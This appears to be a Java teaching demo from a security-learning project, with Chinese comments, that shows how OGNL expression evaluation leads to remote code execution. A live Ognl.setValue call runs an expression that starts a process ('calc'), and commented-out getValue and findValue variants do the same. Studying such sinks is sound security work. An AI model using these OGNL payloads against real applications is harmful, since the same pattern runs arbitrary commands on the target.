package com.pacemrc.javasec.expression.ognl;

import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

/**
 * 进阶使用
 */
public class demo3 {
    public static void main(String[] args) throws OgnlException {
//        1. 如何触发 RCE Sink
//        # getValue()
//        OgnlContext context1 = new OgnlContext();
//        Ognl.getValue("(new java.lang.ProcessBuilder(new java.lang.String[] {'calc'})).start()", context1);

//        # setValue()
        OgnlContext context2 = new OgnlContext();
        Ognl.setValue("((new java.lang.ProcessBuilder(new java.lang.String[] {'calc'})).start())(1)", context2,"");
//        # findValue()
//        OgnlValueStack stack = new OgnlValueStack();
//        stack.findValue("(new java.lang.ProcessBuilder(new java.lang.String[] {'calc'})).start()");


    }
}
